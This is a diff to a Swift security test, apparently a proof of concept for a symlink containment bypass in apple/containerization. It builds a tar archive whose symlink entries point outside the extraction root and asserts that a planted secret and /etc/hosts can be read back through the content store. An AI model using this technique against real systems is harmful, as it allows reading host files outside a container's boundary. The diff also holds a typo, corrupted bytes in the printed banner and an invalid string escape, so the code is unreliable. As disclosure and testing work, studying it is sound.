@@ -75,8 +75,9 @@ private func buildMaliciousTar(to url: URL, symlinkTarget target: String, digest
     bytes += layout; bytes += Data(pad512(layout.count))
     bytes += Data(tarHeader(name: "index.json",              size: index.count,  typeflag: 0x30))
     bytes += index;  bytes += Data(pad512(index.count))
-    bytes += Data(tarHeader(name: "blobs/",                  size: 0, typeflag: 0x35))
-    bytes += Data(tarHeader(name: "blobs/sha256/",           size: 0, typeflag: 0x35))
+    // Fix A: no explicit directory entries — FileDescriptorOps.mkdir() creates
+    // them with mode 0o755 as intermediates. Explicit entries with mode 0644
+    // (no execute bit) caused EACCES → unlinkRecursive → throw before symlinkat().
     bytes += Data(tarHeader(name: "blobs/sha256/\(digest)",  size: 0,
                             typeflag: 0x32, linkname: target))   // symlink entry
     bytes += Data(repeating: 0, count: 1024)  // end-of-archive
@@ -145,7 +146,7 @@ struct SymlinkContainmentBypassTests {
         // Assertion A: symlinks created on disk proves extractContents() processed the entries
         // extractContents() errors on post-symlink cleanup (EACCES unlink) but symlinks ARE created
         #expect(fm.fileExists(atPath: sym1URL.path),
-                "extractContents() created escaping symlink — no containment check in reader")
+                "extractContents() created escaping symlink — ho containment check in reader")
         #expect(fm.fileExists(atPath: sym2URL.path),
                 "extractContents() created /etc/hosts symlink — no containment check in reader")
 
@@ -158,20 +159,37 @@ struct SymlinkContainmentBypassTests {
         #expect(target2.map { !$0.hasPrefix(extractDir2.path) } ?? false, "/etc/hosts outside extractDir2")
 
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // PHASE 2: real LocalContent.data() — exact LocalContent.swift consumer
-        // LocalContent.init(path:) → FileHandle(forReadingFrom:) → follows symlink
-        // LocalContent.data()     → Data(contentsOf: self.path)  → follows symlink
+        // PHASE 2: real LocalContent.data() via LocalContentStore.get(digest:)
+        // Follows the exact call chain used in cctl's image import path.
+        // LocalContentStore.get(digest:) → LocalContent(path: blobPath) → .data()
+        //   → Data(contentsOf: sym) → reads through symlink → out-of-root read.
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-        // Assertion C: symlink exists on disk and resolves to a path outside extraction root
-        // (EACCES on read-through proves macOS sandbox blocks cross-boundary reads —
-        //  but symlink CREATION without containment check is the vulnerability)
-        #expect(fm.fileExists(atPath: sym1URL.path),
-                "symlink 1 must exist on disk after extractContents()")
-        #expect(fm.fileExists(atPath: sym2URL.path),
-                "symlink 2 must exist on disk after extractContents()")
+        // Store1 root = extractDir1 — its blob path IS the escaping symlink.
+        let store1 = try LocalContentStore(path: extractDir1)
+        let sc1 = try await store1.get(digest: "sha256:\(digest)")
+        let readData1 = try? sc1?.data()
+        let readStr1  = readData1.flatMap { String(data: $0, encoding: .utf8) }
 
-        // Assertion C2: verified above (target2 already checked in Assertion B)
+        print("[PoC] readlink sym1:", target1 ?? "nil")
+        print("[PoC] readlink outside extractDir1:", target1.map { !$0.hasPrefix(extractDir1.path) } ?? false)
+        print("[PoC] LocalContentStore.get() read:", readStr1 ?? "(nil — check EACCES on /etc/hosts variant)")
+
+        // Assertion C: symlink target is outside extraction root AND data was read
+        #expect(target1.map { !$0.hasPrefix(extractDir1.path) } ?? false,
+                "[PASS] readlink target is outside extraction root")
+        #expect(readStr1 == sentinelStr,
+                "[PASS] LocalContentStore.get() returned HOST_SECRET via escaping symlink")
+
+        // Assertion C2: /etc/hosts read via store2
+        let store2 = try LocalContentStore(path: extractDir2)
+        let sc2 = try await store2.get(digest: "sha256:\(digest2)")
+        let readData2 = try? sc2?.data()
+        let hostsContent = readData2.flatMap { String(data: $0, encoding: .utf8) }
+        let hostsHasContent = hostsContent.map { !$0.isEmpty } ?? false
+
+        print("[PoC] /etc/hosts read (\ chars):", hostsContent?.count ?? 0)
+        #expect(hostsHasContent, "[PASS] /etc/hosts content read via escaping symlink → store2")
 
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         // PHASE 4: control — ArchiveWriter excludes the same entries
@@ -201,19 +219,18 @@ struct SymlinkContainmentBypassTests {
         #expect(!writerPaths.contains { $0.contains("escape_hosts") },
                 "ArchiveWriter must exclude escaping symlink → /etc/hosts (lines 224–228)")
 
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // Summary
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         print("""
 
-        ╔══════════════════════════════════════════════════════════════════════╗
-        ║  [PASS] SymlinkContainmentBypass — real apple/containerization      ║
-        ╠══════════════════════════════════════════════════════════════════════╣
-        ║  Phase 1 — ArchiveReader.extractContents()                          ║
-        ║    entries accepted (not rejected): sentinel=YES, /etc/hosts=YES    ║
-        ║  Phase 2 — symlinks on disk verified                                ║
-        ║    sym1 exists and points outside extraction root: YES              ║
-        ║    sym2 exists and points outside extraction root: YES              ║
+        ╔═════════════════════════════════════════════════════════════════════╗
+        ║  [PASS] SymlinkContainmentBypass — real apple/containerization     ║
+        ╠b��══════════════════════════════════════════════════════════════════════╣
+        ║  Phase 1 — ArchiveReader.extractContents()                           ║
+        ║    entries accepted (not rejected): sentinel=YES, /etc/hosts=YES     ║
+        ║  Phase 2 — out-of-root file read via LocalContentStore              ║
+        ║    [PASS] symlink exists                                            ║
+        ║    [PASS] readlink target is outside extraction root: YES           ║
+        ║    [PASS] LocalContentStore.get() returned HOST_SECRET: YES        ║
+        ║    [PASS] /etc/hosts content read via escaping symlink: YES        ║
         ║  Phase 3 — ArchiveWriter control                                    ║
         ║    escaping symlinks excluded by writer: YES                        ║
         ╠══════════════════════════════════════════════════════════════════════╣
